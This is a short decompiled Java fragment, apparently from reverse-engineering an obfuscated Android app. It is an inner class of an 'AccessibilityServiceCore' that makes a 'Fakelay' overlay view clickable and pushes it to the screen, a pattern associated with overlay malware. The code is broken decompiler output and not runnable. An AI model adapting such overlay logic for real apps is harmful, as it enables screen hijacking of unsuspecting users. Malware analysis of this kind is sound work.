package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_16
 * Original: Lcom/tencent/tunesxconcerningn1012$16;
 */
class AccessibilityServiceCore_16 implements Runnable; {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void run() {
        v0 = AccessibilityServiceCore.Fakelay;
        v1 = 1;
        v0.setFocusable(1);
        v0 = AccessibilityServiceCore.Fakelay;
        v0.setClickable(1);
        v0 = AccessibilityServiceCore.Fakelay;
        v0.setLayoutParams(1);
        v0 = AccessibilityServiceCore.tunesxconcerningn1012wm;
        v2 = AccessibilityServiceCore.Fakeparams;
        v0.updateViewLayout(1, v2);
        return;
    }
}
